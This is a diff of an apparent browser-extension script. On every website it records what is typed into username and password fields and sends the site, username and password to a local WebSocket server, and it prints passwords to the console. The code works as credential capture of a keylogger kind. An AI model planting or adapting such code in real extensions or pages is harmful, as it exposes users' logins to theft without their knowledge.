@@ -3,79 +3,97 @@ let recordedData = {
     password: ''
 };
 
-let timeoutId = null;
-let socket = new WebSocket('ws://localhost:8765');
+let typingTimer;
+const SITE_URL = window.location.hostname; // Gets the domain of the current site
+const ws = new WebSocket('ws://localhost:8765');
 
-// Send credentials to WebSocket server
-function sendCredentials() {
-    if (recordedData.name && recordedData.password) {
-        const site = window.location.hostname;
+// WebSocket connection setup
+ws.onopen = () => {
+    console.log('WebSocket connection opened');
+};
 
-        const credentials = {
-            site: site,
-            username: recordedData.name,
-            password: recordedData.password
-        };
+ws.onclose = () => {
+    console.log('WebSocket connection closed');
+};
 
-        // Send credentials in the format expected by the Python script
-        socket.send(`credentials:${JSON.stringify(credentials)}`);
-        console.log('Sent credentials to WebSocket server:', credentials);
+ws.onerror = (error) => {
+    console.error('WebSocket error:', error);
+};
+
+ws.onmessage = (event) => {
+    const message = event.data;
+    console.log('Received WebSocket message:', message);
+
+    if (message === 'iwantsite') {
+        sendSite();
+    } else if (message === 'iwantusername') {
+        sendUsername();
+    } else if (message === 'iwantpassword') {
+        sendPassword();
     }
+};
+
+function sendToServer(data) {
+    if (ws.readyState === WebSocket.OPEN) {
+        ws.send(data);
+    } else {
+        console.error('WebSocket is not open. Cannot send data.');
+    }
+}
+
+function sendSite() {
+    const site = SITE_URL;
+    console.log('Sending site:', site);
+    sendToServer(site);
+}
+
+function sendUsername() {
+    const username = recordedData.name;
+    console.log('Sending username:', username);
+    sendToServer(username);
+}
+
+function sendPassword() {
+    const password = recordedData.password;
+    console.log('Sending password:', password);
+    sendToServer(password);
 }
 
 function updateData(fieldType, value) {
     recordedData[fieldType] = value;
     console.log(`Updated ${fieldType}:`, recordedData[fieldType]);
-
-    // Clear previous timeout if it exists
-    if (timeoutId) {
-        clearTimeout(timeoutId);
-    }
-
-    // Set a new timeout to send data after 5 seconds of inactivity
-    timeoutId = setTimeout(sendCredentials, 5000);
 }
 
 function finalizeData() {
-    console.log('Finalizing Data:', recordedData);
-    sendCredentials();
+    if (recordedData.name && recordedData.password) {
+        console.log('Finalized Data:', recordedData);
+        // Send "iwanttowrite" to the WebSocket
+        sendToServer('iwanttowrite');
+    } else {
+        console.log('Both fields are not filled yet');
+    }
 }
 
-document.addEventListener('focus', (event) => {
-    if (event.target.type === 'text' && event.target.name.toLowerCase().includes('name')) {
-        console.log('Focused on username field');
-    } else if (event.target.type === 'password') {
-        console.log('Focused on password field');
-    }
-}, true);
+function resetTypingTimer() {
+    clearTimeout(typingTimer);
+    // Set a timer to finalize data 5 seconds after user stops typing
+    typingTimer = setTimeout(finalizeData, 5000);
+}
 
+// Event listener for input fields
 document.addEventListener('input', (event) => {
-    if ((event.target.type === 'text' && event.target.name.toLowerCase().includes('name')) ||
-        event.target.type === 'password') {
-        updateData(event.target.type === 'text' ? 'name' : 'password', event.target.value);
+    if (event.target.type === 'text' && event.target.name.toLowerCase().includes('name')) {
+        updateData('name', event.target.value);
+    } else if (event.target.type === 'password') {
+        updateData('password', event.target.value);
     }
+    resetTypingTimer(); // Reset the timer on each input event
 }, true);
 
+// Event listener for blur event
 document.addEventListener('blur', (event) => {
     if ((event.target.type === 'text' && event.target.name.toLowerCase().includes('name')) ||
         event.target.type === 'password') {
-        finalizeData();
+        resetTypingTimer(); // Ensure the timer is reset when user leaves the input field
     }
 }, true);
-
-// WebSocket connection handling
-socket.addEventListener('open', () => {
-    console.log('WebSocket connection established.');
-});
-
-socket.addEventListener('message', (event) => {
-    console.log('Message from WebSocket server:', event.data);
-});
-
-socket.addEventListener('error', (event) => {
-    console.error('WebSocket error observed:', event);
-});
-
-socket.addEventListener('close', () => {
-    console.log('WebSocket connection closed.');
-});
